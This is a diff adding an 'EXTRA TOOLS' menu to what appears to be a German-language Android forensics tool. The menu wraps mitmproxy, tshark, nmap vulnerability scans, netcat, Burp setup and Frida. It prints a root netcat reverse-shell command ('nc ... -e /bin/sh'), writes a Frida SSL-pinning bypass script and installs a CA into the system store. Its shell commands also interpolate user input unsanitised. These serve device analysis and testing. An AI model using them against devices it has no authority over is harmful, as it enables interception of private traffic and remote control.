@@ -1841,7 +1841,550 @@ def full_forensics_report(adb: ADB, dev=None, st=None, data=None) -> None:
 
 
 # ═══════════════════════════════════════════════════════════════════════════════
-#  HAUPTMENÜ (14 Optionen)
+# 15. EXTRA TOOLS – Host-seitige Netzwerk-Analyse
+# ═══════════════════════════════════════════════════════════════════════════════
+
+def extra_tools(adb: ADB, dev=None, st=None, data=None) -> None:
+    """Host-seitige EXTRA TOOLS: mitmproxy, tshark, nmap, openssl, arp-scan, Burp."""
+    import subprocess
+
+    def _run(cmd: str, timeout: int = 15) -> str:
+        try:
+            r = subprocess.run(cmd, shell=True, capture_output=True,
+                               text=True, timeout=timeout)
+            return (r.stdout + r.stderr).strip()
+        except subprocess.TimeoutExpired:
+            return "(Timeout)"
+        except Exception as exc:
+            return f"(Fehler: {exc})"
+
+    def _which(tool: str) -> bool:
+        return bool(_run(f"which {tool} 2>/dev/null"))
+
+    # Tool-Verfügbarkeit prüfen
+    tools_status = {
+        "mitmproxy":  _which("mitmproxy"),
+        "mitmdump":   _which("mitmdump"),
+        "tshark":     _which("tshark"),
+        "wireshark":  _which("wireshark"),
+        "nmap":       _which("nmap"),
+        "arp-scan":   _which("arp-scan"),
+        "openssl":    _which("openssl"),
+        "tcpdump":    _which("tcpdump"),
+        "netcat":     _which("nc") or _which("netcat"),
+        "curl":       _which("curl"),
+        "dig":        _which("dig"),
+        "frida":      _which("frida"),
+    }
+
+    while True:
+        ui.clear()
+        ui.rule("🛠️  EXTRA TOOLS — Host-seitige Netzwerk-Analyse", ui.BYELLOW)
+        print(f"\n  {ui.GREY}Tools auf diesem Kali-System verfügbar:{ui.RESET}\n")
+        for t, avail in tools_status.items():
+            col = ui.BGREEN if avail else ui.GREY
+            mark = "✓" if avail else "✗"
+            print(f"  {col}{mark}  {t:<18}{ui.RESET}", end="")
+        print("\n")
+
+        ch = ui.menu("Extra-Tool", [
+            ("1",  "🔴 mitmproxy HTTPS-Intercept    (Proxy auf Port 8080, Gerät umleiten)"),
+            ("2",  "📡 tshark Live-Capture           (Netzwerk-Interface wählen, live Domains)"),
+            ("3",  "🗺  nmap Gerät-Scan              (offene Ports, Services, OS-Erkennung)"),
+            ("4",  "📶 arp-scan Netz-Discovery       (alle Geräte im LAN finden)"),
+            ("5",  "🔐 openssl Cert-Check            (TLS-Zertifikat direkt abrufen + analysieren)"),
+            ("6",  "🔍 dig/nslookup DNS-Analyse      (Domain auflösen, Reverse-DNS, MX, TXT)"),
+            ("7",  "🌐 curl HTTP-Request-Analyse     (Headers · Redirect-Chain · Response)"),
+            ("8",  "🔌 netcat Port-Listener          (TCP/UDP Listener für Verbindungstests)"),
+            ("9",  "🎯 Frida HTTPS-Unpinning         (SSL-Pinning umgehen via Frida-Script)"),
+            ("10", "🏗  Burp Suite Setup-Anleitung   (Android-Proxy, CA-Cert, adb-Tunnel)"),
+            ("11", "📦 Fehlende Tools installieren   (apt install · pip install)"),
+            ("12", "🔄 adb-Reverse-Proxy einrichten  (Gerät → Kali mitmproxy Tunnel)"),
+        ], back_label="Hauptmenü")
+        if ch == "back":
+            return
+
+        # ── 1: mitmproxy ──────────────────────────────────────────────────────
+        if ch == "1":
+            ui.clear()
+            ui.rule("🔴 mitmproxy HTTPS-Intercept", ui.BRED)
+            if not tools_status["mitmproxy"] and not tools_status["mitmdump"]:
+                ui.warn("mitmproxy nicht installiert!")
+                print(f"  {ui.GREY}sudo apt install mitmproxy  ODER  pip install mitmproxy{ui.RESET}")
+                ui.pause(); continue
+
+            # Kali-IP ermitteln
+            kali_ip = _run("ip route get 8.8.8.8 2>/dev/null | grep -oP 'src \\K[\\d.]+'")
+            if not kali_ip:
+                kali_ip = _run("hostname -I 2>/dev/null | awk '{print $1}'")
+
+            print(f"\n  {ui.BOLD}Kali-IP:  {kali_ip or '???'}{ui.RESET}")
+            print(f"\n  {ui.BOLD}Schritt 1 – Gerät-Proxy setzen:{ui.RESET}")
+            print(f"  {ui.GREY}adb shell settings put global http_proxy {kali_ip or 'KALI_IP'}:8080{ui.RESET}")
+            print(f"\n  {ui.BOLD}Schritt 2 – CA-Zertifikat installieren:{ui.RESET}")
+            ca_path = os.path.expanduser("~/.mitmproxy/mitmproxy-ca-cert.pem")
+            print(f"  {ui.GREY}# CA-Cert nach Gerät übertragen:")
+            print(f"  adb push {ca_path} /data/local/tmp/mitmproxy-ca.pem")
+            print(f"  # Auf Gerät installieren (User-CA): Einstellungen → Sicherheit → CA-Zertifikat{ui.RESET}")
+            print(f"\n  {ui.BOLD}Schritt 3 – mitmproxy starten:{ui.RESET}")
+            if ui.confirm("mitmproxy jetzt starten (Web-UI auf :8081)?", True):
+                print(f"\n  {ui.GREY}Starte mitmdump im Hintergrund …{ui.RESET}")
+                log_path = os.path.join(OUT, f"mitm_{int(time.time())}.log")
+                subprocess.Popen(
+                    f"mitmdump -p 8080 -w {log_path} 2>&1 &",
+                    shell=True)
+                time.sleep(1)
+                # Prüfen ob läuft
+                ps = _run("pgrep -a mitmdump 2>/dev/null")
+                if ps:
+                    ui.ok(f"mitmdump läuft (PID: {ps.split()[0]})")
+                    ui.ok(f"Log: {log_path}")
+                else:
+                    ui.warn("mitmdump konnte nicht gestartet werden.")
+                print(f"\n  {ui.GREY}Beenden: kill $(pgrep mitmdump){ui.RESET}")
+                print(f"\n  {ui.BOLD}Proxy wieder entfernen:{ui.RESET}")
+                print(f"  {ui.GREY}adb shell settings delete global http_proxy{ui.RESET}")
+            ui.pause()
+
+        # ── 2: tshark ─────────────────────────────────────────────────────────
+        elif ch == "2":
+            ui.clear()
+            ui.rule("📡 tshark Live-Capture", ui.BCYAN)
+            if not tools_status["tshark"]:
+                ui.warn("tshark nicht installiert!")
+                print(f"  {ui.GREY}sudo apt install tshark{ui.RESET}")
+                ui.pause(); continue
+
+            # Interfaces
+            ifaces_raw = _run("tshark -D 2>/dev/null")
+            print(f"\n  {ui.BOLD}Verfügbare Interfaces:{ui.RESET}")
+            print(f"  {ui.GREY}{ifaces_raw[:600]}{ui.RESET}")
+            print(f"\n  {ui.BOLD}Interface eingeben (z.B. eth0, wlan0):{ui.RESET} ", end="")
+            try:
+                iface = input().strip() or "any"
+            except (EOFError, KeyboardInterrupt):
+                iface = "any"
+
+            print(f"\n  {ui.GREY}Starte tshark auf {iface} (30s) …{ui.RESET}\n")
+            ts = int(time.time())
+            pcap_out = os.path.join(OUT, f"tshark_{ts}.pcap")
+            dns_out  = os.path.join(OUT, f"tshark_dns_{ts}.txt")
+
+            # 30s capture
+            cap_result = _run(
+                f"timeout 30 tshark -i {iface} -w {pcap_out} "
+                f"-f 'port 53 or port 80 or port 443' 2>&1", timeout=35)
+
+            # DNS-Domains extrahieren
+            dns_result = _run(
+                f"tshark -r {pcap_out} -Y dns -T fields "
+                f"-e dns.qry.name 2>/dev/null | sort -u", timeout=10)
+
+            if dns_result.strip():
+                print(f"  {ui.BOLD}Erfasste DNS-Queries:{ui.RESET}")
+                domains_found = [d for d in dns_result.splitlines() if d.strip()]
+                for d in domains_found[:30]:
+                    cat, _ = _cat_domain(d)
+                    col = ui.BRED if _is_malware(d) else (ui.BYELLOW if _is_tracker(d) else ui.BCYAN)
+                    print(f"  {col}{d:<45}{ui.RESET}  [{cat}]")
+                if len(domains_found) > 30:
+                    print(f"  {ui.GREY}… und {len(domains_found)-30} weitere{ui.RESET}")
+                with open(dns_out, "w") as f:
+                    f.write(f"# tshark DNS-Queries {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
+                    for d in domains_found:
+                        cat, _ = _cat_domain(d)
+                        flag = " [TRACKER]" if _is_tracker(d) else ""
+                        flag += " [MALWARE]" if _is_malware(d) else ""
+                        f.write(f"{d:<50}  [{cat}]{flag}\n")
+                ui.ok(f"PCAP:  {pcap_out}")
+                ui.ok(f"DNS:   {dns_out}")
+            else:
+                ui.warn("Keine DNS-Queries erfasst (oder kein Traffic auf Interface).")
+                if os.path.exists(pcap_out):
+                    ui.ok(f"PCAP trotzdem gespeichert: {pcap_out}")
+            ui.pause()
+
+        # ── 3: nmap ───────────────────────────────────────────────────────────
+        elif ch == "3":
+            ui.clear()
+            ui.rule("🗺  nmap Gerät-Scan", ui.BCYAN)
+            if not tools_status["nmap"]:
+                ui.warn("nmap nicht installiert!")
+                print(f"  {ui.GREY}sudo apt install nmap{ui.RESET}")
+                ui.pause(); continue
+
+            # Gerät-IP via ADB
+            dev_ip = adb.shell(
+                "ip -4 addr show wlan0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1")
+            dev_ip = dev_ip.strip().splitlines()[0] if dev_ip.strip() else ""
+            if not dev_ip:
+                dev_ip = adb.shell(
+                    "ifconfig wlan0 2>/dev/null | grep 'inet addr' | awk '{print $2}' | cut -d: -f2")
+                dev_ip = dev_ip.strip()
+
+            if not dev_ip:
+                print(f"\n  {ui.GREY}Gerät-IP eingeben:{ui.RESET} ", end="")
+                try:
+                    dev_ip = input().strip()
+                except (EOFError, KeyboardInterrupt):
+                    dev_ip = ""
+
+            if not dev_ip:
+                ui.warn("Keine Gerät-IP ermittelbar.")
+                ui.pause(); continue
+
+            print(f"\n  Gerät-IP: {ui.BOLD}{dev_ip}{ui.RESET}\n")
+
+            scan_ch = ui.menu("Scan-Typ", [
+                ("1", "Schnell-Scan (Top-100 Ports)"),
+                ("2", "Vollscan (alle 65535 Ports)"),
+                ("3", "Service + OS-Erkennung (-sV -O)"),
+                ("4", "Vuln-Scan (--script vuln)"),
+            ], back_label="Zurück")
+            if scan_ch == "back":
+                continue
+
+            cmds = {
+                "1": f"nmap -F --open {dev_ip}",
+                "2": f"nmap -p- --open {dev_ip}",
+                "3": f"nmap -sV -O --open {dev_ip}",
+                "4": f"nmap --script vuln {dev_ip}",
+            }
+            cmd = cmds.get(scan_ch, cmds["1"])
+            print(f"  {ui.GREY}{cmd}{ui.RESET}\n")
+            print(f"  {ui.GREY}Läuft … (kann 1-5 Minuten dauern){ui.RESET}\n")
+            result = _run(cmd, timeout=300)
+            print(result[:3000])
+            fn = os.path.join(OUT, f"nmap_{dev_ip.replace('.','_')}_{int(time.time())}.txt")
+            with open(fn, "w") as f:
+                f.write(f"# nmap {cmd}\n\n{result}")
+            ui.ok(f"Gespeichert: {fn}")
+            ui.pause()
+
+        # ── 4: arp-scan ───────────────────────────────────────────────────────
+        elif ch == "4":
+            ui.clear()
+            ui.rule("📶 arp-scan Netz-Discovery", ui.BCYAN)
+            if not tools_status["arp-scan"]:
+                ui.warn("arp-scan nicht installiert!")
+                print(f"  {ui.GREY}sudo apt install arp-scan{ui.RESET}")
+                ui.pause(); continue
+
+            iface_raw = _run("ip route | grep default | awk '{print $5}' | head -1")
+            iface = iface_raw.strip() or "eth0"
+            print(f"\n  Interface: {ui.BOLD}{iface}{ui.RESET}")
+            print(f"  {ui.GREY}Scanne lokales Netz …{ui.RESET}\n")
+            result = _run(f"sudo arp-scan --interface={iface} --localnet 2>/dev/null", timeout=30)
+            if "sudo" in result and "password" in result.lower():
+                result = _run(f"arp-scan --interface={iface} --localnet 2>/dev/null", timeout=30)
+            print(result[:3000])
+            ui.pause()
+
+        # ── 5: openssl cert ───────────────────────────────────────────────────
+        elif ch == "5":
+            ui.clear()
+            ui.rule("🔐 openssl Zertifikat-Analyse", ui.BCYAN)
+            if not tools_status["openssl"]:
+                ui.warn("openssl nicht installiert!")
+                ui.pause(); continue
+
+            print(f"\n  {ui.BOLD}Domain oder IP eingeben:{ui.RESET} ", end="")
+            try:
+                target = input().strip()
+            except (EOFError, KeyboardInterrupt):
+                target = ""
+            if not target:
+                ui.pause(); continue
+
+            host, _, port = target.partition(":")
+            port = port or "443"
+            print(f"\n  {ui.GREY}Verbinde zu {host}:{port} …{ui.RESET}\n")
+
+            cert_raw = _run(
+                f"echo | timeout 10 openssl s_client -connect {host}:{port} "
+                f"-servername {host} 2>/dev/null", timeout=15)
+            cert_info = _run(
+                f"echo | timeout 10 openssl s_client -connect {host}:{port} "
+                f"-servername {host} 2>/dev/null | openssl x509 -noout -text 2>/dev/null", timeout=15)
+
+            # TLS-Version
+            tls_m = re.search(r'Protocol\s*:\s*(TLS\S+|SSL\S+)', cert_raw)
+            print(f"  TLS-Version: {ui.BOLD}{tls_m.group(1) if tls_m else '?'}{ui.RESET}")
+            # Cipher
+            cipher_m = re.search(r'Cipher\s*:\s*(\S+)', cert_raw)
+            print(f"  Cipher:      {ui.BOLD}{cipher_m.group(1) if cipher_m else '?'}{ui.RESET}")
+            # Subject
+            subj_m = re.search(r'Subject:.*?CN\s*=\s*([^\n,/]+)', cert_info)
+            print(f"  Subject CN:  {ui.BOLD}{subj_m.group(1).strip() if subj_m else '?'}{ui.RESET}")
+            # Issuer
+            iss_m = re.search(r'Issuer:.*?O\s*=\s*([^\n,/]+)', cert_info)
+            print(f"  Ausgestellt von: {iss_m.group(1).strip() if iss_m else '?'}")
+            # Gültigkeit
+            nb_m  = re.search(r'Not Before\s*:\s*([^\n]+)', cert_info)
+            na_m  = re.search(r'Not After\s*:\s*([^\n]+)', cert_info)
+            print(f"  Gültig von:  {nb_m.group(1).strip() if nb_m else '?'}")
+            print(f"  Gültig bis:  {na_m.group(1).strip() if na_m else '?'}")
+            # SANs
+            san_m = re.search(r'Subject Alternative Name:([^\n]+(?:\n\s+[^\n]+)*)', cert_info)
+            if san_m:
+                print(f"  SANs:        {san_m.group(1).strip()[:120]}")
+            # Warnung bei schwachen Parametern
+            if tls_m and tls_m.group(1) in ("TLSv1.0", "TLSv1.1", "SSLv3"):
+                print(f"\n  {ui.BRED}⚠ VERALTETE TLS-VERSION: {tls_m.group(1)}{ui.RESET}")
+            ui.pause()
+
+        # ── 6: dig/nslookup ───────────────────────────────────────────────────
+        elif ch == "6":
+            ui.clear()
+            ui.rule("🔍 dig/nslookup DNS-Analyse", ui.BCYAN)
+            print(f"\n  {ui.BOLD}Domain eingeben:{ui.RESET} ", end="")
+            try:
+                domain = input().strip()
+            except (EOFError, KeyboardInterrupt):
+                domain = ""
+            if not domain:
+                ui.pause(); continue
+
+            queries = [
+                ("A-Record",     f"dig +short A {domain} 2>/dev/null || nslookup -type=A {domain}"),
+                ("AAAA-Record",  f"dig +short AAAA {domain} 2>/dev/null"),
+                ("MX-Record",    f"dig +short MX {domain} 2>/dev/null"),
+                ("TXT-Record",   f"dig +short TXT {domain} 2>/dev/null"),
+                ("NS-Record",    f"dig +short NS {domain} 2>/dev/null"),
+                ("CNAME",        f"dig +short CNAME {domain} 2>/dev/null"),
+                ("Reverse-DNS",  f"dig +short -x $(dig +short A {domain} 2>/dev/null | head -1) 2>/dev/null"),
+                ("WHOIS (kurz)", f"whois {domain} 2>/dev/null | grep -iE 'registr|creat|expir|org|country' | head -10"),
+            ]
+            for label, cmd in queries:
+                out = _run(cmd, timeout=8).strip()
+                if out:
+                    ui.kv(label, out[:200])
+            ui.pause()
+
+        # ── 7: curl HTTP-Analyse ──────────────────────────────────────────────
+        elif ch == "7":
+            ui.clear()
+            ui.rule("🌐 curl HTTP-Request-Analyse", ui.BCYAN)
+            if not tools_status["curl"]:
+                ui.warn("curl nicht installiert!")
+                ui.pause(); continue
+
+            print(f"\n  {ui.BOLD}URL eingeben (z.B. https://example.com):{ui.RESET} ", end="")
+            try:
+                url = input().strip()
+            except (EOFError, KeyboardInterrupt):
+                url = ""
+            if not url:
+                ui.pause(); continue
+            if not url.startswith("http"):
+                url = "https://" + url
+
+            # Headers + Status
+            print(f"\n  {ui.GREY}Analysiere {url} …{ui.RESET}\n")
+            headers = _run(
+                f"curl -s -I -L --max-redirs 5 --connect-timeout 8 "
+                f"-A 'Mozilla/5.0' '{url}' 2>&1", timeout=15)
+            # Redirect-Chain
+            chain = _run(
+                f"curl -s -L --max-redirs 10 -o /dev/null -w '%{{url_effective}}\\n' "
+                f"--connect-timeout 8 '{url}' 2>/dev/null", timeout=15)
+
+            print(f"  {ui.BOLD}Headers:{ui.RESET}")
+            for line in headers.splitlines()[:20]:
+                col = ui.BGREEN if line.startswith("HTTP") else ui.GREY
+                print(f"  {col}{line}{ui.RESET}")
+            if chain.strip() and chain.strip() != url:
+                print(f"\n  {ui.BOLD}Redirect → {ui.BCYAN}{chain.strip()}{ui.RESET}")
+
+            # Sicherheits-Headers checken
+            sec_headers = {
+                "Strict-Transport-Security": ("HSTS", ui.BGREEN),
+                "Content-Security-Policy":   ("CSP", ui.BGREEN),
+                "X-Frame-Options":           ("XFO", ui.BGREEN),
+                "X-Content-Type-Options":    ("XCTO", ui.BGREEN),
+                "X-XSS-Protection":          ("XSS", ui.BYELLOW),
+            }
+            print(f"\n  {ui.BOLD}Sicherheits-Header:{ui.RESET}")
+            for h, (short, col) in sec_headers.items():
+                found = h.lower() in headers.lower()
+                mark = f"{col}✓{ui.RESET}" if found else f"{ui.BRED}✗{ui.RESET}"
+                print(f"  {mark}  {short} ({h})")
+            ui.pause()
+
+        # ── 8: netcat ─────────────────────────────────────────────────────────
+        elif ch == "8":
+            ui.clear()
+            ui.rule("🔌 netcat Port-Listener", ui.BCYAN)
+            print(f"\n  {ui.BOLD}Port eingeben (z.B. 4444):{ui.RESET} ", end="")
+            try:
+                port_str = input().strip()
+            except (EOFError, KeyboardInterrupt):
+                port_str = "4444"
+            port_str = port_str or "4444"
+
+            kali_ip = _run("hostname -I 2>/dev/null | awk '{print $1}'").strip()
+            print(f"\n  {ui.BOLD}Listener starten auf Port {port_str}:{ui.RESET}")
+            print(f"  {ui.GREY}nc -lvnp {port_str}{ui.RESET}\n")
+            print(f"  {ui.BOLD}Gerät verbinden (via ADB):{ui.RESET}")
+            print(f"  {ui.GREY}adb shell nc {kali_ip} {port_str}{ui.RESET}\n")
+            print(f"  {ui.BOLD}Oder Gerät→Kali Reverse-Shell (Root):{ui.RESET}")
+            print(f"  {ui.GREY}adb shell \"su -c 'nc {kali_ip} {port_str} -e /bin/sh'\"{ui.RESET}\n")
+            if ui.confirm("Listener jetzt starten?", False):
+                print(f"\n  {ui.GREY}Starte nc -lvnp {port_str} …  (Ctrl+C zum Beenden){ui.RESET}\n")
+                try:
+                    subprocess.run(f"nc -lvnp {port_str}", shell=True)
+                except KeyboardInterrupt:
+                    pass
+            ui.pause()
+
+        # ── 9: Frida HTTPS-Unpinning ──────────────────────────────────────────
+        elif ch == "9":
+            ui.clear()
+            ui.rule("🎯 Frida HTTPS-SSL-Unpinning", ui.BCYAN)
+            has_frida = _which("frida")
+            has_frida_server = bool(adb.shell(
+                "ls /data/local/tmp/frida-server 2>/dev/null").strip())
+
+            print(f"  frida (Host):    {'✓' if has_frida else '✗'}")
+            print(f"  frida-server (Gerät): {'✓' if has_frida_server else '✗'}\n")
+
+            if not has_frida:
+                print(f"  {ui.GREY}Installieren: pip install frida-tools{ui.RESET}")
+
+            print(f"  {ui.BOLD}SSL-Pinning umgehen (universelles Script):{ui.RESET}")
+            frida_script = '''
+Java.perform(function() {
+  // OkHttp3 CertificatePinner bypass
+  try {
+    var CertificatePinner = Java.use("okhttp3.CertificatePinner");
+    CertificatePinner.check.overload("java.lang.String", "java.util.List").implementation = function() {
+      console.log("[Frida] OkHttp3 SSL Pinning bypassed");
+    };
+  } catch(e) {}
+  // TrustManager bypass
+  try {
+    var TrustManager = [{
+      checkClientTrusted: function(a,b){},
+      checkServerTrusted: function(a,b){},
+      getAcceptedIssuers: function(){ return []; }
+    }];
+    var SSLContext = Java.use("javax.net.ssl.SSLContext");
+    SSLContext.init.implementation = function(a, TrustManager, c) {
+      SSLContext.init.call(this, a, TrustManager, c);
+      console.log("[Frida] SSLContext.init hooked");
+    };
+  } catch(e) {}
+  console.log("[Frida] SSL-Unpinning aktiv");
+});'''
+            script_path = os.path.join(OUT, "ssl_unpin.js")
+            with open(script_path, "w") as f:
+                f.write(frida_script)
+            print(f"  {ui.GREY}{frida_script[:400]}{ui.RESET}")
+            print(f"\n  Script gespeichert: {script_path}")
+            print(f"\n  {ui.BOLD}Starten mit:{ui.RESET}")
+            print(f"  {ui.GREY}frida -U -f com.TARGET.app -l {script_path} --no-pause{ui.RESET}")
+            print(f"  {ui.GREY}frida -U -n APPNAME -l {script_path}{ui.RESET}")
+            print(f"\n  {ui.BOLD}Alle laufenden Apps:{ui.RESET}")
+            if has_frida and has_frida_server:
+                apps = _run("frida-ps -U 2>/dev/null | head -20", timeout=8)
+                print(f"  {ui.GREY}{apps}{ui.RESET}")
+            ui.pause()
+
+        # ── 10: Burp Suite Setup ──────────────────────────────────────────────
+        elif ch == "10":
+            ui.clear()
+            ui.rule("🏗  Burp Suite Android-Setup", ui.BCYAN)
+            kali_ip = _run("hostname -I 2>/dev/null | awk '{print $1}'").strip()
+            print(f"""
+  {ui.BOLD}Komplette Anleitung: Android → Burp Suite (Kali){ui.RESET}
+
+  {ui.BOLD}1. Burp Suite starten + Proxy konfigurieren:{ui.RESET}
+  {ui.GREY}  Burp → Proxy → Options → Add → Port 8080, Interface {kali_ip}{ui.RESET}
+
+  {ui.BOLD}2. Gerät-Proxy setzen:{ui.RESET}
+  {ui.GREY}  adb shell settings put global http_proxy {kali_ip}:8080{ui.RESET}
+
+  {ui.BOLD}3. Burp CA-Cert herunterladen und installieren:{ui.RESET}
+  {ui.GREY}  # Im Gerät-Browser: http://burpsuite → Cert herunterladen
+  # Oder via Burp: Proxy → Options → Export CA certificate
+  adb push burp-ca.der /data/local/tmp/burp-ca.der
+  # Gerät: Einstellungen → Sicherheit → CA-Zertifikat → Datei installieren{ui.RESET}
+
+  {ui.BOLD}4. adb-Port-Forward (Gerät→Kali):{ui.RESET}
+  {ui.GREY}  adb reverse tcp:8080 tcp:8080{ui.RESET}
+
+  {ui.BOLD}5. Für System-Apps (Root):{ui.RESET}
+  {ui.GREY}  # CA in System-Store installieren:
+  openssl x509 -inform DER -in burp-ca.der -out burp-ca.pem
+  HASH=$(openssl x509 -inform PEM -subject_hash_old -in burp-ca.pem | head -1)
+  cp burp-ca.pem $HASH.0
+  adb push $HASH.0 /system/etc/security/cacerts/
+  adb shell chmod 644 /system/etc/security/cacerts/$HASH.0{ui.RESET}
+
+  {ui.BOLD}6. SSL-Pinning umgehen → Option 9 (Frida){ui.RESET}
+
+  {ui.BOLD}7. Proxy wieder entfernen:{ui.RESET}
+  {ui.GREY}  adb shell settings delete global http_proxy{ui.RESET}
+""")
+            ui.pause()
+
+        # ── 11: Fehlende Tools installieren ───────────────────────────────────
+        elif ch == "11":
+            ui.clear()
+            ui.rule("📦 Fehlende Tools installieren", ui.BCYAN)
+            missing_apt = [t for t in ["mitmproxy", "tshark", "nmap", "arp-scan"]
+                           if not tools_status.get(t)]
+            missing_pip = [t for t in ["frida-tools"] if not tools_status.get("frida")]
+
+            if not missing_apt and not missing_pip:
+                ui.ok("Alle Tools sind bereits installiert!")
+            else:
+                if missing_apt:
+                    print(f"\n  {ui.BOLD}Apt-Pakete installieren:{ui.RESET}")
+                    cmd = f"sudo apt install -y {' '.join(missing_apt)}"
+                    print(f"  {ui.GREY}{cmd}{ui.RESET}")
+                    if ui.confirm("Jetzt installieren?", True):
+                        result = _run(cmd, timeout=300)
+                        print(result[:2000])
+                if missing_pip:
+                    print(f"\n  {ui.BOLD}Pip-Pakete:{ui.RESET}")
+                    pip_cmd = f"pip install {' '.join(missing_pip)}"
+                    print(f"  {ui.GREY}{pip_cmd}{ui.RESET}")
+                    if ui.confirm("Jetzt installieren?", True):
+                        result = _run(pip_cmd, timeout=120)
+                        print(result[:1000])
+            # Status aktualisieren
+            tools_status.update({t: _which(t) for t in tools_status})
+            ui.pause()
+
+        # ── 12: adb-Reverse-Proxy ─────────────────────────────────────────────
+        elif ch == "12":
+            ui.clear()
+            ui.rule("🔄 adb-Reverse-Proxy Einrichtung", ui.BCYAN)
+            kali_ip = _run("hostname -I 2>/dev/null | awk '{print $1}'").strip()
+            print(f"\n  {ui.BOLD}Kali-IP: {kali_ip}{ui.RESET}\n")
+            print(f"  {ui.BOLD}Schritt 1 – adb reverse (Gerät→Kali Port-Forward):{ui.RESET}")
+            result1 = adb.shell("echo 'ADB aktiv'")
+            print(f"  {ui.GREY}adb reverse tcp:8080 tcp:8080{ui.RESET}")
+            rev_result = _run("adb reverse tcp:8080 tcp:8080 2>&1", timeout=10)
+            print(f"  {ui.GREY}→ {rev_result or 'OK'}{ui.RESET}")
+            print(f"\n  {ui.BOLD}Schritt 2 – Gerät-Proxy auf localhost setzen:{ui.RESET}")
+            print(f"  {ui.GREY}adb shell settings put global http_proxy 127.0.0.1:8080{ui.RESET}")
+            proxy_result = _run("adb shell settings put global http_proxy 127.0.0.1:8080 2>&1", timeout=8)
+            if not proxy_result or proxy_result == "":
+                ui.ok("Proxy gesetzt: 127.0.0.1:8080")
+            else:
+                print(f"  {ui.GREY}{proxy_result}{ui.RESET}")
+            print(f"\n  {ui.BOLD}Schritt 3 – mitmproxy / Burp auf Port 8080 starten{ui.RESET}")
+            print(f"  {ui.GREY}Jetzt mitmproxy/Burp auf Kali starten → Option 1{ui.RESET}")
+            print(f"\n  {ui.BOLD}Rückgängig machen:{ui.RESET}")
+            print(f"  {ui.GREY}adb shell settings delete global http_proxy")
+            print(f"  adb reverse --remove tcp:8080{ui.RESET}")
+            ui.pause()
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+#  HAUPTMENÜ (15 Optionen)
 # ═══════════════════════════════════════════════════════════════════════════════
 
 def menu(adb: ADB, dev=None, st=None, data=None) -> None:
@@ -1866,6 +2409,7 @@ def menu(adb: ADB, dev=None, st=None, data=None) -> None:
             ("12", "📡 Tiefen-Traffic-Capture      (tcpdump/PCAP · logcat 60s · Netz-Snapshot)"),
             ("13", f"{ui.BCYAN}{ui.BOLD}🗂️  Forensik-Komplett-Bericht  (alle Checks · Risiko-Score · Export){ui.RESET}"),
             ("14", "📁 Alles speichern             (Vollexport JSON+TXT+netstats+DNS)"),
+            ("15", f"{ui.BYELLOW}{ui.BOLD}🛠️  EXTRA TOOLS                 (mitmproxy·tshark·nmap·openssl·arp·Burp){ui.RESET}"),
         ], back_label="Hauptmenü")
         if ch in ("back", "quit"):
             return
@@ -1885,6 +2429,7 @@ def menu(adb: ADB, dev=None, st=None, data=None) -> None:
                 "12": deep_traffic_capture,
                 "13": full_forensics_report,
                 "14": export_all,
+                "15": extra_tools,
             }
             fn = dispatch.get(ch)
             if fn:
